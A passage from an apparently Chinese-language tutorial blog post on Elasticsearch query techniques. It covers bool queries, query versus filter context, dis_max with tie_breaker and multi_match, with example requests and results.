href="#Query-amp-Filtering-与-多字符串多字段查询" class="headerlink" title="Query &amp; Filtering 与 多字符串多字段查询"></a>Query &amp; Filtering 与 多字符串多字段查询</h2><p><img src="/images/big-data/es-05/6.jpg" alt="6"></p><ul><li>高级搜索的功能：支持多项文本输入，针对多个字段进行搜索</li><li>搜索引擎一般也提供基于时间，价格等条件的过滤</li><li>在 ES 中，有 Query 和 Filter 两种 Context<ul><li>Query Context：相关性算分</li><li>Filter Context：不需要算分（Yes or No）, 可以利用 Cache 获得更好的性能</li></ul></li></ul><h3 id="条件组合"><a href="#条件组合" class="headerlink" title="条件组合"></a>条件组合</h3><ul><li>假设要搜索一本电影，包含了以下条件<ul><li>评论中包含了 Guitar ，用户打分高于 3 分，同时上映时间在 1993 到 2000 年之间</li></ul></li><li>这个搜索包含了 3 段逻辑，针对不同的字段<ul><li>评论字段中要包含 Guitar 、用户评论大于 3、上映时间日期在给定范围内</li></ul></li><li>同时包含这三个逻辑，并且有比较好的性能<ul><li>复合查询： bool Query</li></ul></li></ul><h3 id="bool-查询"><a href="#bool-查询" class="headerlink" title="bool 查询"></a>bool 查询</h3><ul><li>一个 bool 查询，是一个或者多个查询子句的组合<ul><li>总共包含 4 种子句，其中 2 种会影响算分，2 种不影响算分</li></ul></li><li>相关性并不只是全文本搜索的专利。也适合 yes | no 的子句，匹配的子句越多，相关性评分越高。如果多条查询子句被合并为一条复合查询语句，比如 bool 查询，则每个查询子句计算得出的评分会被合并到总的相关性评分中。</li></ul><p><img src="/images/big-data/es-05/7.jpg" alt="7"></p><h3 id="bool-查询语句"><a href="#bool-查询语句" class="headerlink" title="bool 查询语句"></a>bool 查询语句</h3><ul><li>子查询可以任意顺序出现</li><li>可以嵌套多个查询</li><li>如果你的 bool 查询中，没有 must 条件，should 中必须满足一条查询</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line">POST /products/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">10</span>,<span class="attr">"avaliable"</span>:<span class="literal">true</span>,<span class="attr">"date"</span>:<span class="string">"2018-01-01"</span>,<span class="attr">"productID"</span>:<span class="string">"XHDK-A-1293-#fJ3"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">20</span>,<span class="attr">"avaliable"</span>:<span class="literal">true</span>,<span class="attr">"date"</span>:<span class="string">"2019-01-01"</span>,<span class="attr">"productID"</span>:<span class="string">"KDKE-B-9947-#kL5"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">3</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">30</span>,<span class="attr">"avaliable"</span>:<span class="literal">true</span>,<span class="attr">"productID"</span>:<span class="string">"JODL-X-1937-#pV7"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">4</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"price"</span>:<span class="number">30</span>,<span class="attr">"avaliable"</span>:<span class="literal">false</span>,<span class="attr">"productID"</span>:<span class="string">"QQPX-R-3956-#aD8"</span>&#125;</span><br><span class="line"><span class="comment">//查询</span></span><br><span class="line">POST /products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: &#123;</span><br><span class="line">        <span class="attr">"term"</span>: &#123;</span><br><span class="line">          <span class="attr">"price"</span>: <span class="string">"30"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"term"</span>: &#123;</span><br><span class="line">          <span class="attr">"avaliable"</span>: <span class="string">"true"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"must_not"</span>: &#123;</span><br><span class="line">        <span class="attr">"range"</span>: &#123;</span><br><span class="line">          <span class="attr">"price"</span>: &#123;</span><br><span class="line">            <span class="attr">"lte"</span>: <span class="number">10</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"should"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"term"</span>: &#123;</span><br><span class="line">            <span class="attr">"productID.keyword"</span>: <span class="string">"JODL-X-1937-#pV7"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"term"</span>: &#123;</span><br><span class="line">            <span class="attr">"productID.keyword"</span>: <span class="string">"XHDK-A-1293-#fJ3"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"minimum_should_match"</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：ES中 同时使用 should 和 must 导致只有 must 生效</strong></p><blockquote><p>should 并不是 or 的关系</p></blockquote><p><strong>解决1：</strong></p><p>使用多个must嵌套查询 将should组成的bool查询包含在其中一个must查询中</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">GET _search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"bool"</span>: &#123;</span><br><span class="line">            <span class="attr">"should"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"match_phrase"</span>: &#123;</span><br><span class="line">                  <span class="attr">"title"</span>: <span class="string">"疫情期间"</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"match_phrase"</span>: &#123;</span><br><span class="line">                  <span class="attr">"content"</span>: <span class="string">"疫情期间"</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"1"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"must_not"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">            <span class="attr">"enabled"</span>: <span class="number">0</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"highlight"</span>: &#123;</span><br><span class="line">    <span class="attr">"pre_tags"</span>: [</span><br><span class="line">      <span class="string">"&lt;font color='red'&gt;"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"post_tags"</span>: [</span><br><span class="line">      <span class="string">"&lt;/font&gt;"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"fields"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>: &#123;&#125;,</span><br><span class="line">      <span class="attr">"content"</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决2：</strong></p><ul><li>minimum_should_match 设置为 1</li></ul><h3 id="如何解决结构化查询-“包含而不是相等”-的问题"><a href="#如何解决结构化查询-“包含而不是相等”-的问题" class="headerlink" title="如何解决结构化查询 - “包含而不是相等” 的问题"></a>如何解决结构化查询 - “包含而不是相等” 的问题</h3><p><img src="/images/big-data/es-05/8.jpg" alt="8"></p><p><strong>增加 count 字段，使用 bool 查询</strong></p><ul><li>从业务角度，按需改进 ES 数据模型</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /newmovies/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"Father of the Bridge Part II"</span>,<span class="attr">"year"</span>:<span class="number">1995</span>,<span class="attr">"genre"</span>:<span class="string">"Comedy"</span>,<span class="attr">"genre_count"</span>:<span class="number">1</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"Dave"</span>,<span class="attr">"year"</span>:<span class="number">1993</span>,<span class="attr">"genre"</span>:[<span class="string">"Comedy"</span>,<span class="string">"Romance"</span>],<span class="attr">"genre_count"</span>:<span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Query Context - 影响算分</span></span><br><span class="line"><span class="comment">// must 有算分</span></span><br><span class="line">POST /newmovies/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"bool"</span>: &#123;</span><br><span class="line">    <span class="attr">"must"</span>: [</span><br><span class="line">      &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"genre.keyword"</span>: &#123;<span class="attr">"value"</span>: <span class="string">"Comedy"</span>&#125;&#125;&#125;,</span><br><span class="line">      &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"genre_count"</span>: &#123;<span class="attr">"value"</span>: <span class="number">1</span>&#125;&#125;&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Filter Context - 不影响算分</span></span><br><span class="line"><span class="comment">// Filter。不参与算分，结果的score是0</span></span><br><span class="line">POST /newmovies/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"bool"</span>: &#123;</span><br><span class="line">    <span class="attr">"filter"</span>: [</span><br><span class="line">      &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"genre.keyword"</span>: &#123;<span class="attr">"value"</span>: <span class="string">"Comedy"</span>&#125;&#125;&#125;,</span><br><span class="line">      &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"genre_count"</span>: &#123;<span class="attr">"value"</span>: <span class="number">1</span>&#125;&#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bool-嵌套"><a href="#bool-嵌套" class="headerlink" title="bool 嵌套"></a>bool 嵌套</h3><p><img src="/images/big-data/es-05/9.jpg" alt="9"></p><h3 id="查询语句的结构，会对相关度算分产生影响"><a href="#查询语句的结构，会对相关度算分产生影响" class="headerlink" title="查询语句的结构，会对相关度算分产生影响"></a>查询语句的结构，会对相关度算分产生影响</h3><ul><li>同一层级下的竞争字段，具有相同的权重</li><li>通过嵌套 bool 查询，可以改变对算分的影响</li></ul><p><img src="/images/big-data/es-05/10.jpg" alt="10"></p><h3 id="控制字段的-Boosting"><a href="#控制字段的-Boosting" class="headerlink" title="控制字段的 Boosting"></a>控制字段的 Boosting</h3><p><img src="/images/big-data/es-05/11.jpg" alt="11"></p><h3 id="Not-Quite-Not"><a href="#Not-Quite-Not" class="headerlink" title="Not Quite Not"></a>Not Quite Not</h3><p><img src="/images/big-data/es-05/12.jpg" alt="12"></p><h3 id="Boosting-Query"><a href="#Boosting-Query" class="headerlink" title="Boosting Query"></a>Boosting Query</h3><p><img src="/images/big-data/es-05/13.jpg" alt="13"></p><p><strong>小结</strong></p><ul><li>Query Context vs Filter Context</li><li>Bool Query - 更多的条件组合</li><li>查询结构与相关性算分</li><li>如何控制查询的精确度<ul><li>Boosting &amp; Boosting Query</li></ul></li></ul><h2 id="单字符串多字段查询：Dis-Max-Query"><a href="#单字符串多字段查询：Dis-Max-Query" class="headerlink" title="单字符串多字段查询：Dis Max Query"></a>单字符串多字段查询：Dis Max Query</h2><h3 id="单字符串查询"><a href="#单字符串查询" class="headerlink" title="单字符串查询"></a>单字符串查询</h3><ul><li>Google 只提供一个输入框，查询相关的多个字段</li><li>支持按照价格，时间等进行过虑</li></ul><p><strong>单字符串查询的实例</strong></p><ul><li>博客标题<ul><li>文档1中出现”Brown”</li></ul></li><li>博客内容<ul><li>文档1中出现了”Brown”</li><li>“Brown fox”在文档 2中全部出现，并且保持和查询一致的顺序（目测相关性最高）</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PUT /blogs/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>: <span class="string">"Quick brown rabbits"</span>,</span><br><span class="line">  <span class="attr">"body"</span>: <span class="string">"Brown rabbits are commonly seen."</span></span><br><span class="line">&#125;</span><br><span class="line">PUT /blogs/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>: <span class="string">"Keeping pets healthy"</span>,</span><br><span class="line">  <span class="attr">"body"</span>: <span class="string">"My quick brown fox eats rabbits on a regular basis."</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询语句</span></span><br><span class="line">POST /blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"should"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Brown fox"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">            <span class="attr">"body"</span>: <span class="string">"Brown fox"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="算分过程"><a href="#算分过程" class="headerlink" title="算分过程"></a>算分过程</h4><ul><li>查询 should 语句中的两个查询</li><li>加和两个查询的评分</li><li>乘以匹配语句的总数</li><li>除以所有语句的总数</li></ul><h4 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">"hits" : &#123;</span><br><span class="line">    "total" : &#123;</span><br><span class="line">      "value" : 2,</span><br><span class="line">      "relation" : "eq"</span><br><span class="line">    &#125;,</span><br><span class="line">    "max_score" : 0.90425634,</span><br><span class="line">    "hits" : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"blogs"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> : <span class="string">"_doc"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"1"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">0.90425634</span>, <span class="comment">// 因为2个字段都有brown</span></span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"title"</span> : <span class="string">"Quick brown rabbits"</span>,</span><br><span class="line">          <span class="attr">"body"</span> : <span class="string">"Brown rabbits are commonly seen."</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"blogs"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> : <span class="string">"_doc"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"2"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">0.77041256</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"title"</span> : <span class="string">"Keeping pets healthy"</span>,</span><br><span class="line">          <span class="attr">"body"</span> : <span class="string">"My quick brown fox eats rabbits on a regular basis."</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/big-data/es-05/14.jpg" alt="14"> <img src="/images/big-data/es-05/15.jpg" alt="15"></p><h3 id="Disjunction-Max-Query-查询"><a href="#Disjunction-Max-Query-查询" class="headerlink" title="Disjunction Max Query 查询"></a>Disjunction Max Query 查询</h3><ul><li>上列中，title 和 body 相互竞争<ul><li>不应该将分数简单叠加，而是应该找个单个最佳匹配的字段的评分</li></ul></li><li>Disjunction Max Query<ul><li>将任何与任一查询匹配的文档作为结果返回。采用字段上最匹配的评分返回</li></ul></li></ul><p><img src="/images/big-data/es-05/16.jpg" alt="16"></p><h3 id="最佳字段查询调优"><a href="#最佳字段查询调优" class="headerlink" title="最佳字段查询调优"></a>最佳字段查询调优</h3><ul><li>有一些情况下，同时匹配 title 和 body 字段的文档比只与一个字段匹配的文档的相关度更高</li><li>但 disjunction max query 查询指挥简单的使用单个最佳匹配语句的评分_scoce 作为整体评分，怎么办？</li></ul><h3 id="通过-Tie-Breaker-参数调整"><a href="#通过-Tie-Breaker-参数调整" class="headerlink" title="通过 Tie Breaker 参数调整"></a>通过 Tie Breaker 参数调整</h3><ul><li>获得最佳匹配语句的评分 _score</li><li>将其他匹配语句的评分 与 tie_breaker 相乘</li><li>对以上评分求和并规范化<ul><li>Tie Breanker 是一个介于 0-1 之间的浮点数。0 代表使用最佳匹配；1 代表所有语句同等重要。</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST blogs/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"dis_max"</span>: &#123;</span><br><span class="line">      <span class="attr">"queries"</span>: [</span><br><span class="line">          &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"title"</span>: <span class="string">"Quick pets"</span> &#125;&#125;,</span><br><span class="line">          &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"body"</span>:  <span class="string">"Quick pets"</span> &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"tie_breaker"</span>: <span class="number">0.2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="单字符串多字段查询-Multi-Match"><a href="#单字符串多字段查询-Multi-Match" class="headerlink" title="单字符串多字段查询: Multi Match"></a>单字符串多字段查询: Multi Match</h2><ul><li>最佳字段（Best Fields）<ul><li>当字段之间相互竞争，又相互关联。例如 title 和 body 这样的字段，评分来自最匹配字段</li></ul></li><li>多数字段（Most Fields）<ul><li>处理英文内容时：一种常见的手段是，在主字段（English Analyzer），抽取词干，加入同义词，以匹配更多的文档。相同的文本，加入子字段（Standard Analyzer），以提供更加精确的匹配。其他字段作为匹配文档提高性相关度的信号。匹配字段越多越好</li></ul></li><li>混合字段（Cross Field）<ul><li>对于某些实体，例如人名，地址，图书信息。需要在多个字段中确定信息，单个字段只能作为整体的一部分。希望在任何这些列出的字段中尽可能找出多的词</li></ul></li></ul><h3 id="Multi-Match-Query"><a href="#Multi-Match-Query" class="headerlink" title="Multi Match Query"></a>Multi Match Query</h3><ul><li>Best Fields 是默认类型，可不指定</li><li>Minimum should match 等参数可以传递到生成的 query 中</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"best_fields"</span>,</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"Quick pets"</span>,</span><br><span class="line">      <span class="attr">"fields"</span>: [<span class="string">"title"</span>,<span class="string">"body"</span>],</span><br><span class="line">      <span class="attr">"tie_breaker"</span>: <span class="number">0.2</span>,</span><br><span class="line">      <span class="attr">"minimum_should_match"</span>: <span class="string">"20%"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>查询案例</strong></p><ul><li>英文分词器，导致精确度降低，时态信息丢失</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">PUT /titles</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:&#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"analyzer"</span>: <span class="string">"english"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST titles/_bulk</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"My dog barks"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span>:&#123;<span class="attr">"_id"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"title"</span>:<span class="string">"I see a lot of barking dogs on the road "</span>&#125;</span><br><span class="line"></span><br><span class="line">GET titles/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"barking dogs"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果 因为是english 分词 ，且短 则 id 排第一个</span></span><br><span class="line">"hits" : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"titles"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> : <span class="string">"_doc"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"1"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">0.24399278</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"title"</span> : <span class="string">"My dog barks"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"titles"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> : <span class="string">"_doc"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"2"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">0.1854345</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"title"</span> : <span class="string">"I see a lot of barking dogs on the road "</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p><strong>重新设置 mapping</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 